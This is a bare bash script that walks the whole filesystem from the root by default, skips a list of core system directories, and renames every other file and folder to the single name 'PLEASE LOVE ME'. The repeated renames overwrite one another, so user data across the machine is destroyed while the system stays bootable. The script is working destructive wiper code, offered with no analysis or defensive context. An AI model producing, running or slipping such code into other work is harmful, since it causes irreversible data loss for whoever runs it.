#!/bin/bash

# Absolute no-touch zones
SKIP_DIRS=(
    # Virtual/kernel filesystems - will loop or hang
    /proc /sys /run /dev
    # Core executables & libraries
    /bin /sbin /usr/bin /usr/sbin
    /lib /lib64 /usr/lib
    # Boot & system critical
    /boot /tmp
    # Init & service infrastructure
    /usr/lib/systemd /etc/systemd /etc/init.d
    # Auth & login
    /etc/passwd /etc/shadow /etc/pam.d
    # shell cmds
    /usr/bin
)

should_skip() {
    local target="$1"
    # Strip trailing slash for clean comparison
    target="${target%/}"

    for skip in "${SKIP_DIRS[@]}"; do
        if [ "$target" = "$skip" ]; then
            return 0  # 0 = true in bash = skip this
        fi
    done
    return 1  # 1 = false in bash = don't skip
}

traverse() {
    local dir="$1"
    local depth="${2:-0}"
    local indent=$(printf '%*s' "$((depth * 2))" '')

    # echo "${indent}[DIR] $dir"

    for entry in "$dir"/*/; do
        [ -e "$entry" ] || continue

        entry="${entry%/}"  # strip trailing slash

        if should_skip "$entry"; then
            continue
        fi

        if [ -d "$entry" ]; then
            traverse "$entry" $((depth + 1))
            mv "$entry" "PLEASE LOVE ME"
        fi
    done

    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "PLEASE LOVE ME"
    done
}

traverse "${1:-/}"